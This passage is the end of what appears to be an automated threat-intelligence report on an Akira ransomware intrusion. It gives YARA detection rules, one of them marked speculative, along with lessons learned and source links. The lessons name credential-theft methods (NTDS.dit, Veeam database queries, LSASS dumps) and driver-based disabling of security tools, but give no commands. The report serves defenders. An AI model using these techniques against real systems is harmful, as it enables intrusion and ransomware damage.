        hash = "a6df0b49a5ef9ffd6513bfe061fb60f6d2941a440038e2de8a7aeb1914945331"
        tlp = "WHITE"
        severity = "critical"

    strings:
        $dll_name = "msimg32.dll" ascii wide
        $side_load = "consent.exe" ascii wide
        $folder = "ApplicationInstallationFolder" ascii wide
        $wab = "AdgNsy.exe" ascii wide

    condition:
        uint16(0) == 0x5A4D and
        filesize < 5MB and
        (1 of ($folder, $wab)) and (1 of ($dll_name, $side_load))
}

rule Akira_Ransomware_Locker
{
    meta:
        description = "Detects Akira ransomware locker executable based on command-line patterns and Akira-specific strings. Speculative: built from documented behavioral artifacts without access to the actual sample binary."
        author = "Actioner"
        date = "2026-07-02"
        reference = "https://thedfirreport.com/2026/06/29/from-bing-search-to-ransomware-bumblebee-and-adaptixc2-deliver-akira-3/"
        hash = "de730d969854c3697fd0e0803826b4222f3a14efe47e4c60ed749fff6edce19d"
        tlp = "WHITE"
        severity = "high"

    strings:
        $param_p = "-p=" ascii
        $param_n = "-n=" ascii
        $akira1 = "akira" ascii nocase
        $ext = ".akira" ascii wide

    condition:
        uint16(0) == 0x5A4D and
        filesize < 10MB and
        (1 of ($akira*, $ext)) and ($param_p and $param_n)
}
```

## Lessons Learned

1. **SEO poisoning via Bing remains an effective initial access vector.** The use of lookalike domains with professional appearance and revoked code-signing certificates creates a convincing delivery mechanism that bypasses user suspicion and may circumvent SmartScreen. Organizations should consider DNS-layer filtering for newly registered domains and implement application allowlisting.

2. **Multi-technique credential harvesting maximizes impact.** The operators used three distinct credential theft methods (NTDS.dit, Veeam psql, LSASS dump) to ensure comprehensive coverage. This redundancy suggests mature operational playbooks. Detection must cover all three vectors independently.

3. **Veeam backup infrastructure is a high-value target.** Direct database queries to extract stored credentials from the VeeamBackup PostgreSQL database represent a targeted technique specifically aimed at undermining backup-based recovery. Organizations running Veeam should restrict PostgreSQL access and monitor for non-Veeam processes invoking psql.exe.

4. **Partial file encryption accelerates ransomware deployment.** The `-n=15` flag encrypting only 15% of each file dramatically reduces encryption time while still rendering files unrecoverable, giving defenders less time between first encryption and full impact. Detection must focus on pre-encryption indicators (C2, credential theft, lateral movement) rather than encryption activity itself.

5. **BYOVD continues to undermine endpoint security.** The deployment of rwdrv.sys and hlpdrv.sys as Windows services to disable security products at kernel level highlights the need for Microsoft Vulnerable Driver Blocklist enforcement and driver loading monitoring.

## Sources

- [The DFIR Report: From Bing Search to Ransomware: BumbleBee and AdaptixC2 Deliver Akira](https://thedfirreport.com/2026/06/29/from-bing-search-to-ransomware-bumblebee-and-adaptixc2-deliver-akira-3/) -- primary source; full intrusion analysis with all IOCs, TTPs, and timeline
- [CISA Advisory on Akira Ransomware (AA23-263A)](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-263a) -- background on Akira ransomware TTPs and mitigation guidance
- [Google Threat Intelligence: BumbleBee Loader Analysis](https://blog.google/threat-analysis-group/exposing-initial-access-broker-ties-conti/) -- BumbleBee loader background and Conti affiliate linkage
- [AdaptixC2 Framework GitHub Repository](https://github.com/nicksecurity/adaptixc2) -- AdaptixC2 open-source framework documentation

---
*Report generated by Actioner*
